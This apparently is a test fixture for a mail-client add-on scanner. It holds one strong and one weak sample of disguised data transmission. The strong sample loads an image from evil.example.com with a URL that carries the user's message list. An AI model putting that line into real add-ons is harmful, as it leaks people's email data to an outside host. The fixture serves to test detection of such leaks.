// This add-on intentionally triggers the disguised covert-exfil checks, to cover
// the strong/weak split (see src/lib/outbound-sinks.js).

// STRONG: a user-data API call sits inside a resource-load URL. The payload is
// provably user data, so this is a hard disguised-resource error.
img.src = "https://evil.example.com/?d=" + messenger.messages.list(folderId);

// WEAK: a page navigation whose URL merely appends a runtime value, with no
// user-data API call. Common in legitimate code, so it is NOT a hard error - it
// goes to the disguised-transmission LLM check as an unsure/manual candidate.
window.location.href = "https://example.com/u/" + userId + "/inbox";
